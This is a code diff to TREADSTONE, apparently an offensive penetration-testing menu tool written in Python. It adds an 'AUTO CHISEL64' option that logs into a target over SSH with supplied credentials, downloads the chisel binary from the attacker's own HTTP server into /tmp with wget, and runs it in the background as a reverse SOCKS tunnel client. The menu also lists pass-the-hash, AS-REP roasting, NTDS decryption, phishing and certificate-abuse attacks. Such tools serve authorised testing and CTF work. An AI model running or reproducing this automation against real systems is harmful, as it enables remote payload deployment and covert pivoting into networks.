@@ -32,6 +32,7 @@ import binascii
 import pyfiglet
 import datetime
 import requests
+import paramiko
 import linecache
 import itertools
 
@@ -62,6 +63,11 @@ else:
 # Details : Create functional subroutines called from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
+
+def ssh_command(string):
+  ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(string)
+  print(ssh_stdout.read().decode())
+#   ssh.exec_command(string)
 
 def sort(string):
    revision = ",".join(OrderedDict.fromkeys(string.split(',')))
@@ -818,7 +824,7 @@ def options():
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504) LFI OS Checker (604) Crack-Map-Exec (704) Certipy ESC4                        " + '\u2551')
    print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505) LFI   Wordlist (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606) Blood    Hound (706) Certipy ESC6 (996) MANUAL CHISEL64  " + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j  Console (707) Certipy ESC7 (997) DEPLOY CHISEL64  " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j  Console (707) Certipy ESC7 (997) AUTO   CHISEL64  " + '\u2551')
    print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59)               (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (608) Neo4j Database (708) Certipy ESC8 (998) SSH PortForward  " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60)               (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350) ADD AD Usernames (450)              (509)                (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
    if proxyChains == 1:
@@ -4624,6 +4630,55 @@ while True:
                localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
                localCOM("xdotool type './" + httpDir + "/windows/win_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
                localCOM("xdotool key Ctrl+Tab")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Auto start local linux/windows chisel server
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '997':
+      choice = "python3 -m http.server --bind " + localIP + " 5678"
+      print(colored("[*] Specified local service started...", colour3))
+      localCOM("xdotool key Ctrl+Shift+T")
+      localCOM("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
+      dispBanner("HTTP SERVER",0) 
+      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      localCOM("xdotool type '" + choice + "'; xdotool key Return")
+      localCOM("xdotool key Ctrl+Tab")     
+
+      portChoice = input("[?] Please enter the receiving port number: ")
+      if portChoice.isnumeric():
+         targetChoice = input("[?] Please enter the target port number: ")
+      if targetChoice.isnumeric():     
+         print(colored("[*] Starting local windows chisel server...", colour3))              
+         localCOM("xdotool key Ctrl+Shift+T")
+         localCOM("xdotool key Alt+Shift+S; xdotool type 'LINUX CHISEL SERVER'; xdotool key Return")
+         dispBanner("LINUX CHISEL SERVER",0) 
+         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+         localCOM("xdotool type './" + httpDir + "/linux/lin_chisel64 server --port " + portChoice + " --reverse --socks5'; xdotool key Return")
+         localCOM("xdotool key Ctrl+Tab")      
+      
+      print(colored("[*] Connecting to remote server...", colour3))
+      ssh = paramiko.SSHClient()
+      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+      ssh.connect('' + DOM.rstrip(" "), username='' + USR.rstrip(" "), password='' + PAS.rstrip(" "))    
+      
+      if OSF[:5] == "LINUX":
+
+            print("[+] Installing lin_chisel64, please wait...")
+            ssh_command("cd /; mkdir tmp")
+            ssh_command("cd /; cd /tmp; wget http://" + localIP2.rstrip(" ") + ":5678/TREADSTONE/linux/lin_chisel64 ./lin_chisel64")
+            print("[+] Starting client services...") 
+            ssh_command("cd  /; cd /tmp; chmod +x ./lin_chisel64 ")
+            ssh_command("cd  /; cd /tmp; ./lin_chisel64 client " + localIP2.rstrip(' ') + ":" + portChoice + " R:" + targetChoice + ":127.0.0.1:" + targetChoice + " > /dev/null 2>&1 &")
+            ssh_command("jobs -l")
+      else:
+         pass
+      ssh.close()
       prompt()
       
 # ------------------------------------------------------------------------------------- 
